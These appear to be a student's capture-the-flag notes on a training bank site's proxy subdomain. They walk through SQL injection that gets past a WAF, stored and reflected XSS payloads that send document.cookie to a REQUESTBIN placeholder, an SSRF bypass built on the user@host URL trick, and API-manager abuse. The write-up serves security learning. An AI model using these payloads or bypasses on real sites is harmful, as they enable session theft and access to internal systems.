# Week 9: ctfproxy2 subdomain

## flagprinter API

403 Forbidden - API disabled due to security reasons (intern writes bad code)

Deploy own API with Origin as flagprinter.quoccabank.com

Enable API and access flagprinter through API to get flag

Ceebs to actually verify ctfproxy2 key

Treated as internal network

## payportal-v2 API

Probing:

- `'` displays nothing whilst `"` returns a SQL error
- `" or 1=1-- ` blocked by WAF
- `_or_` and `--_` and `#_` blocked by WAF
- `"or 1=1;_` (with space at the end) works as final payload

## science-tomorrow API

- Comment (WAF_IS_TRIVIAL)
  - alert, fetch (case insensitive) gets blocked by WAF, document.location is fine
  - `<scr<script>ipt>` gives unencoded `<scr>ipt>`, which means `<script` gets removed
  - parts of opening script gets filtered out - `<<scriptscript>` works but gets encoded
  - img works - but if javascript is in the src, the whole thing gets encoded
  - `<img src='' onerror=document.location="https://www.google.com">` redirects to google
  - Final payload: `<img src='' onerror=document.location="REQUESTBIN/"+document.cookie>`
- Query (XSS_IS_TRIVIAL)
  - Previous payload is now reflected with `< src='' =document.location=BLAH>`
  - onerror gets filtered (case insensitive), space splits opening tag
  - `<imimgg` works for tag
  - Similar final payload to before: `<imimgg src='' ononerrorerror=document.location="REQUESTBIN/"+document.cookie>`
  - Intercept report to admin form, sending this query instead

## Update avatar (/me) -> /flag page

- flag page

  - Status 418 - I am a teapot!
  - Internal addresses only
  - Deploy new API to ctfproxy2.quoccabank.com/flag
  - We can't show you the result because we're secure - UPDATE: Our security manager Norman told us that this is vulnerable to SSRF attacks. Please insert ctfproxy2-enabled header and set it to 1 in your API response on your server to allow ASP to serve this response. This makes us absolutely unhackable.

- Update avatar

  - typing test.png -> Our Machine Learning algorithm thinks you are a hacker! ('NoneType' object has no attribute 'group') - sounds like Python

  - Seems like a regex group - check source code

    ```python
    url = request.form.get("avatar", "")
    if not url.endswith(".png"):
      flash("Avatar must be png file!", "danger")
      return redirect(url_for("me"))
    try:
      blacklist = ['?', '127.', 'localhost', '0/', '::', '[', ']']
      for w in blacklist:
        if w in url:
          raise Exception("'%s' is dangerous" % w)
      try:
        domain = re.match(r"^https?://([a-zA-Z0-9-_.]+)", url).group(1)
      except IndexError:
        raise Exception("invalid url")
      ip = socket.gethostbyname(domain)
      if ipaddress.ip_address(unicode(ip)).is_private:
        raise Exception("it is forbidden to access internal server " + ip)
    ```

  - Conditions

    - End with .png
    - No blacklist words as substring
    - Domain matched with regex should not refer to an internal server, although we want to access an internal url

  - `http://192.168.1.2/me.png` bypasses blacklist but get blocked by the final exception

  - Updating teapot url as avatar: ctfproxy2.quoccabank.com/static/teapot.png returns forbidden to access internal server 10.152.183.138 (last exception)

    - ctfproxy2.quoccabank.com gets mapped to an internal IP (A-record)
    - Tried accessing /flag by changing host field in HTTP request from an external ctfproxy2.quoccabank.com to that IP address, but host could not be resolved

  - Need to find a payload where an arbitrary public domain gets detected and passes the checks, but the actual url points to an internal address

    - Tried giving it a website which included an iframe / redirected to internal 127.0.0.1/flag, but only raw page source text could be found in the image
    - Changed A record of website to point to that internal address, but was picked up by the last WAF check
    - Sent payload in form: `https://www.google.com@MALICIOUS_SITE/flag#.png` where the malicious side has an A record pointing to 127.0.0.1
      - Needs to start with http(s) and end with .png
      - PRIMARY_SITE@SECONDARY_SITE
        - Domain regex stops at @, so only PRIMARY_SITE is picked up -> which is public
        - Firefox: @ says you are about to log in to the secondary site with the username of the primary site - accessing this url sends you to SECONDARY_SITE
    - Save image as .html to access /flag internally - SSRF

## /list

- Intercept search request on /list -> change internal=0 to internal=1

- flagprinter-v2 api - no permission - try to enable it?

  - /enable/flagprinter-v2 returns 404

- Deploy new api similarly to flagprinter. However, this doesn't work

- Intercept - experimenting by changing type of description field to number -> error returned expected type string

  - Golang errors

  - Adding random field -> expected name, origin, description and dependsOn fields

  - Adding a dependsOn field with string value for flagprinter-v2.quoccabank.com -> error expected list of strings, not just string

  - Final body:

    ```json
    {
      "name": "anything",
      "origin": "flagprinter-v2.quoccabank.com",
      "description": "anything",
      "dependsOn": [
        "flagprinter-v2.quoccabank.com"
      ]
    }
    ```

- Enabling the "anything" api will allow access to the flagprinter-v2 api. Accessing the flagprinter-v2 api gives the flag HOW_DID_YOU_ENABLE_ME

Random:

- Deploying a new API contacts the endpoint ctfproxy2.quoccabank.com/api/ctfproxy2-manager/create

